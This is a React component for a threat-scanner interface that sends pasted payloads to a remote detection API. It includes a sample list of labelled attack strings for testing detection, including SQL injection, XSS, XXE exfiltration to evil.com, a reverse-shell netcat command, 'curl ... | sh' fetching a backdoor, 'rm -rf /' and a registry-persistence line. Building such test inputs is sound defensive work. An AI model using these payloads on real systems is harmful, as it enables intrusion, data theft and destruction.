import React, { useState } from 'react';
import axios from 'axios';

const ThreatScanner = () => {
  const [payload, setPayload] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [isScanning, setIsScanning] = useState(false);

  const scanPayload = async () => {
    if (!payload.trim()) return;
    
    setIsScanning(true);
    try {
       const API_URL = "https://favournetwork-app-production-d24d.up.railway.app/"
      const response = await axios.post(`${API_URL}/api/threats/scan`, {
        payload: payload
      });
      setScanResult(response.data);
    } catch (error) {
      console.error('Error scanning payload:', error);
      alert('Error scanning payload');
    } finally {
      setIsScanning(false);
    }
  };
const samplePayloads = [
  // === SQL INJECTION (15 payloads) ===
  "SELECT * FROM users WHERE id = 1 OR 1=1",
  "union select username, password from users",
  "admin' OR '1'='1' --",
  "'; DROP TABLE users; --",
  "' UNION SELECT 1,2,3,4,5 --",
  "' AND 1=1 AND 'x'='x",
  "' OR EXISTS(SELECT * FROM users) --",
  "'; EXEC xp_cmdshell('dir') --",
  "' UNION SELECT @@version,NULL --",
  "' OR SLEEP(5) --",
  "'; UPDATE users SET password='hacked' --",
  "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0 --",
  "' OR BENCHMARK(1000000,MD5('test')) --",
  "'; INSERT INTO logs VALUES ('hacked') --",
  "' OR (SELECT COUNT(*) FROM users) > 0 --",

  // === XSS ATTACKS (15 payloads) ===
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert('XSS')>",
  "<body onload=alert('XSS')>",
  "<iframe src=javascript:alert('XSS')>",
  "<a href=\"javascript:alert('XSS')\">Click</a>",
  "<div onmouseover=alert('XSS')>Hover</div>",
  "<form><button formaction=javascript:alert(1)>XSS</button>",
  "<input onfocus=alert('XSS') autofocus>",
  "<video><source onerror=alert('XSS')>",
  "<audio src=x onerror=alert('XSS')>",
  "<marquee onstart=alert('XSS')>Hello</marquee>",
  "<details ontoggle=alert('XSS')>",
  "<select onfocus=alert('XSS')></select>",
  "<keygen onfocus=alert('XSS')>",

  // === PATH TRAVERSAL (10 payloads) ===
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..%255c..%255c..%255cwindows%255csystem.ini",
  "..%c0%af..%c0%af..%c0%afetc/passwd",
  "..%252f..%252f..%252fetc/passwd",
  "../../../../../../../etc/shadow",
  "C:\\Windows\\System32\\config\\SAM",
  "/proc/self/environ",

  // === COMMAND INJECTION (12 payloads) ===
  "; ls -la /etc/",
  "| cat /etc/passwd",
  "&& whoami",
  "`id`",
  "$(cat /etc/shadow)",
  "| net user hacker Password123 /add",
  "&& nc -lvp 4444 -e /bin/sh",
  "; ping -c 5 192.168.1.1",
  "| wget http://malicious.com/shell.php",
  "&& curl http://evil.com/backdoor.sh | sh",
  "; system('rm -rf /')",
  "| reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v backdoor /t REG_SZ /d \"C:\\backdoor.exe\"",

  // === CODE INJECTION (8 payloads) ===
  "<?php system($_GET['cmd']); ?>",
  "<?php echo shell_exec('id'); ?>",
  "<% Runtime.getRuntime().exec(\"calc\") %>",
  "${@system(\"whoami\")}",
  "#{7*7}",
  "{{7*7}}",
  "eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))",
  "setTimeout('alert(1)',0)",

  // === LDAP INJECTION (5 payloads) ===
  "*)(&(objectClass=*))(|(objectClass=*",
  "*)(uid=*))(|(uid=*",
  "*))%00",
  "admin*)(|(password=*",
  "*)(|(objectclass=*",

  // === XXE ATTACKS (5 payloads) ===
  "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
  "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/malicious.dtd\">%remote;]>",
  "<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://evil.com/?%file;'>\">",
  "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>",
  "<!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;]>",

  // === SERVER-SIDE TEMPLATE INJECTION (6 payloads) ===
  "${7*7}",
  "{{7*7}}",
  "<%= 7*7 %>",
  "#{7*7}",
  "${{7*7}}",
  "{{''.__class__.__mro__[1].__subclasses__()}}",

  // === NO-SQL INJECTION (5 payloads) ===
  "{\"$where\": \"this.password == 'admin'\"}",
  "{\"$ne\": \"invalid\"}",
  "{\"$gt\": \"\"}",
  "{\"$regex\": \".*\"}",
  "{\"username\": {\"$exists\": true}}",

  // === HEADER INJECTION (4 payloads) ===
  "HTTP/1.1 200 OK\\r\\nLocation: javascript:alert(1)",
  "Host: example.com\\r\\nX-Forwarded-Host: evil.com",
  "User-Agent: Mozilla\\r\\nX-Forwarded-For: 127.0.0.1",
  "Referer: http://evil.com\\r\\nCookie: admin=true",

  // === SSRF ATTACKS (5 payloads) ===
  "http://169.254.169.254/latest/meta-data/",
  "http://localhost:22/",
  "http://127.0.0.1:5984/",
  "http://[::1]:25/",
  "file:///etc/passwd",

  // === JWT ATTACKS (3 payloads) ===
  "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
  "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9",
  "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"admin\":true}.signature",

  // === SAFE PAYLOADS (for comparison) ===
  "normal website request",
  "GET /index.html HTTP/1.1",
  "POST /api/login {\"username\":\"user\",\"password\":\"pass\"}",
  "User logged in successfully",
  "Database connection established",
  "File uploaded: report.pdf",
  "API response: 200 OK",
  "Session created for user123",
  "Password reset email sent",
  "Backup completed successfully"
];

  return (
    <div className="space-y-6">
      <div className="bg-gradient-to-r from-cyan-900 to-blue-900 rounded-xl p-6 border border-cyan-500">
        <h2 className="text-2xl font-bold text-white mb-2">Threat Scanner</h2>
        <p className="text-cyan-200">Analyze network payloads for potential security threats</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Scanner Input */}
        <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
          <h3 className="text-lg font-bold text-white mb-4">Scan Payload</h3>
          
          <div className="space-y-4">
            <textarea
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              placeholder="Enter network payload to scan..."
              className="w-full h-40 bg-gray-700 border border-gray-600 rounded-lg p-4 text-white font-mono text-sm focus:border-cyan-500 focus:outline-none"
            />
            
            <button
              onClick={scanPayload}
              disabled={isScanning || !payload.trim()}
              className="w-full bg-cyan-600 hover:bg-cyan-700 disabled:opacity-50 py-3 rounded-lg font-medium transition-colors"
            >
              {isScanning ? 'Scanning...' : 'Scan for Threats'}
            </button>
          </div>

          {/* Sample Payloads */}
          <div className="mt-6">
            <h4 className="text-sm font-medium text-gray-300 mb-3">Sample Payloads:</h4>
            <div className="space-y-2">
              {samplePayloads.map((sample, index) => (
                <button
                  key={index}
                  onClick={() => setPayload(sample)}
                  className="block w-full text-left p-3 bg-gray-700 hover:bg-gray-600 rounded-lg text-sm text-gray-300 transition-colors overflow-scroll"
                >
                  {sample}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Results */}
        <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
          <h3 className="text-lg font-bold text-white mb-4">Scan Results</h3>
          
          {!scanResult ? (
            <div className="text-center py-12 text-gray-500">
              <div className="text-4xl mb-4">🔍</div>
              <p>Enter a payload and click scan to see results</p>
            </div>
          ) : (
            <div className="space-y-4">
              {/* Overall Result */}
              <div className={`p-4 rounded-lg border ${
                scanResult.isThreat 
                  ? 'bg-red-900 border-red-500' 
                  : 'bg-green-900 border-green-500'
              }`}>
                <div className="flex items-center justify-between">
                  <span className="text-lg font-bold text-white">
                    {scanResult.isThreat ? 'THREAT DETECTED' : 'NO THREATS FOUND'}
                  </span>
                  <span className="text-2xl">
                    {scanResult.isThreat ? '🚨' : '✅'}
                  </span>
                </div>
                <div className="text-sm text-gray-300 mt-1">
                  Scanned at: {new Date(scanResult.scannedAt).toLocaleString()}
                </div>
              </div>

              {/* Threats List */}
              {scanResult.threats.length > 0 && (
                <div>
                  <h4 className="font-medium text-white mb-3">Detected Threats:</h4>
                  <div className="space-y-3">
                    {scanResult.threats.map((threat, index) => (
                      <div key={index} className="p-3 bg-red-900 border border-red-700 rounded-lg">
                        <div className="flex items-center justify-between mb-2">
                          <span className="font-medium text-white">{threat.type}</span>
                          <span className={`px-2 py-1 rounded text-xs font-medium ${
                            threat.severity === 'high' ? 'bg-red-500' : 'bg-orange-500'
                          }`}>
                            {threat.severity}
                          </span>
                        </div>
                        <div className="text-sm text-red-200">
                          Pattern: <code className="bg-red-800 px-1 rounded">{threat.pattern}</code>
                        </div>
                        <div className="text-xs text-red-300 mt-1">
                          Position: {threat.position}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default ThreatScanner;